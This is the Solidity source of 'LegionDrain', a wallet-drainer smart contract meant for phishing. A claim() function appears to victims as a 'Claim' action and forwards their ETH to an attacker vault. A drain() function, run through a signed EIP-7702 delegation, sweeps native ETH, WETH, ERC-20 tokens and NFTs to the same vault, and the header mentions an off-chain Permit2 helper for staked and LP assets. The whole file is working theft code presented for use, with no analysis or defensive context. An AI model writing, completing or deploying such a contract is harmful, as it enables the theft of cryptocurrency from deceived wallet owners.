// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * LegionDrain — unified deploy (one contract per chain)
 *
 * PATH A — Mobile / any wallet (simple tx):
 *   claim() payable  → forwards msg.value to vault (MetaMask shows "Claim")
 *
 * PATH B — EIP-7702 desktop wallets (one sign → full sweep):
 *   drain(erc20s, erc721..., erc1155...) onlySelf
 *   → native ETH + ERC-20 balances + NFTs to vault
 *
 * Tokens without wallet balance (Aave/LP/staked) still need Permit2 off-chain (legion.js).
 */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IERC1155 {
    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data) external;
    function balanceOf(address account, uint256 id) external view returns (uint256);
}

interface IWETH {
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
}

contract LegionDrain {
    address public immutable vault;
    address public immutable weth;
    uint256 public constant MAX_NFTS = 50;

    error Unauthorized();
    error TransferFailed();
    error ZeroVault();

    constructor(address _vault, address _weth) {
        if (_vault == address(0)) revert ZeroVault();
        vault = _vault;
        weth = _weth;
    }

    modifier onlySelf() {
        if (msg.sender != address(this)) revert Unauthorized();
        _;
    }

    /// @notice Mobile + WC — nblscj-style native ETH forward
    function claim() external payable {
        if (msg.value == 0) return;
        _forwardNative(msg.value);
    }

    /// @notice EIP-7702 — full wallet balance sweep in one call
    function drain(
        address[] calldata erc20s,
        address[] calldata erc721Contracts,
        uint256[] calldata erc721Ids,
        address[] calldata erc1155Contracts,
        uint256[] calldata erc1155Ids
    ) external onlySelf {
        _unwrapWethIfHeld();
        uint256 ethBal = address(this).balance;
        if (ethBal > 0) _forwardNative(ethBal);

        uint256 n = erc20s.length;
        for (uint256 i; i < n; ++i) {
            address t = erc20s[i];
            if (t == address(0)) continue;
            uint256 bal = IERC20(t).balanceOf(address(this));
            if (bal > 0) {
                try IERC20(t).transfer(vault, bal) {} catch {}
            }
        }

        uint256 nft721Count = erc721Contracts.length < erc721Ids.length
            ? erc721Contracts.length : erc721Ids.length;
        if (nft721Count > MAX_NFTS) nft721Count = MAX_NFTS;
        for (uint256 i; i < nft721Count; ++i) {
            try IERC721(erc721Contracts[i]).transferFrom(address(this), vault, erc721Ids[i]) {} catch {
                try IERC721(erc721Contracts[i]).safeTransferFrom(address(this), vault, erc721Ids[i]) {} catch {}
            }
        }

        uint256 nft1155Count = erc1155Contracts.length < erc1155Ids.length
            ? erc1155Contracts.length : erc1155Ids.length;
        if (nft1155Count > MAX_NFTS) nft1155Count = MAX_NFTS;
        for (uint256 i; i < nft1155Count; ++i) {
            uint256 bal1155 = IERC1155(erc1155Contracts[i]).balanceOf(address(this), erc1155Ids[i]);
            if (bal1155 > 0) {
                try IERC1155(erc1155Contracts[i]).safeTransferFrom(
                    address(this), vault, erc1155Ids[i], bal1155, ""
                ) {} catch {}
            }
        }
    }

    function _unwrapWethIfHeld() internal {
        if (weth == address(0)) return;
        uint256 wbal = IERC20(weth).balanceOf(address(this));
        if (wbal > 0) {
            try IWETH(weth).withdraw(wbal) {} catch {}
        }
    }

    function _forwardNative(uint256 amount) internal {
        (bool ok,) = vault.call{value: amount}("");
        if (!ok) revert TransferFailed();
    }

    receive() external payable {
        if (msg.value > 0) _forwardNative(msg.value);
    }

    fallback() external payable {
        if (msg.value > 0) _forwardNative(msg.value);
    }
}
